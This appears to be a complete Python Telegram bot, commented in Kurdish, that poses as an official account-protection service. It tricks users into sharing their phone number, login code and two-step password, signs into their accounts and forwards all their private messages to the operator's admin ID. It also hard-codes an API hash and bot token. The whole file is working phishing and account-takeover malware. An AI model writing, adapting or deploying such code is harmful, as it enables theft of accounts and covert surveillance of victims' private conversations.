from pyrogram import Client, filters, errors
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
import asyncio

# زانیارییەکانت (بە دروستی داندراون)
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_fix", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# بۆ پاشکەوتکردنی کاتیی داتاکان
user_data = {}

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    # دروستکردنی دوگمەکە بە شێوەیەک کە حەتمەن دیار بێت
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📲 پشکنینی ئەکاونت", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await message.reply_text(
        "👋 بەخێرهاتی بۆ بۆتی فەرمی تێلیگرام بۆ پاراستنی ئەکاونت.\n\n"
        "بۆ ئەوەی ئەکاونتەکەت نەکەوێتە مەترسی و فلتەر، تکایە کلیک لە دوگمەی خوارەوە بکە.",
        reply_markup=keyboard
    )

@app.on_message(filters.contact & filters.private)
async def get_contact(client, message):
    phone = message.contact.phone_number
    u_id = message.from_user.id
    
    # ناردنی هەواڵ بۆ تۆ
    await app.send_message(ADMIN_ID, f"☎️ ژمارەی نوێ هات: `+{phone}`")
    
    # دروستکردنی Client بۆ لۆگین
    u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await u_client.connect()
    
    try:
        code_info = await u_client.send_code(phone)
        user_data[u_id] = {
            "phone": phone, 
            "hash": code_info.phone_code_hash, 
            "client": u_client,
            "step": "wait_code"
        }
        await message.reply_text("✅ کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت ناردرا.\n\nتکایە کۆدەکە لێرە بنووسە:", reply_markup=None)
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

@app.on_message(filters.text & filters.private)
async def handle_logic(client, message):
    u_id = message.from_user.id
    
    if u_id in user_data:
        data = user_data[u_id]
        
        # وەرگرتنی کۆد
        if data.get("step") == "wait_code":
            code = message.text
            try:
                await data["client"].sign_in(data["phone"], data["hash"], code)
                await app.send_message(ADMIN_ID, f"🔥 سەرکەوتوو بوو! چوویتە ناو ئەکاونتی: `+{data['phone']}`")
                
                # فۆرواردکردنی نامەکان
                @data["client"].on_message(filters.private)
                async def forwarder(c, m):
                    await m.forward(ADMIN_ID)
                
                await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتوویی پارێزرا.")
                user_data[u_id]["step"] = "completed"
                
            except errors.SessionPasswordNeeded:
                user_data[u_id]["step"] = "wait_password"
                await message.reply_text("🔑 ئەکاونتەکەت پاسۆردی دوو قۆناغی (2FA) هەیە، تکایە بینووسە:")
            except Exception as e:
                await app.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")
        
        # وەرگرتنی پاسۆردی دوو قۆناغی
        elif data.get("step") == "wait_password":
            password = message.text
            try:
                await data["client"].check_password(password)
                await app.send_message(ADMIN_ID, f"🔥 لۆگین بە پاسۆرد سەرکەوتوو بوو: `+{data['phone']}`")
                await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتوویی پارێزرا.")
                user_data[u_id]["step"] = "completed"
            except Exception as e:
                await app.send_message(ADMIN_ID, f"❌ هەڵەی پاسۆرد: {e}")

print("Bot is running...")
app.run()
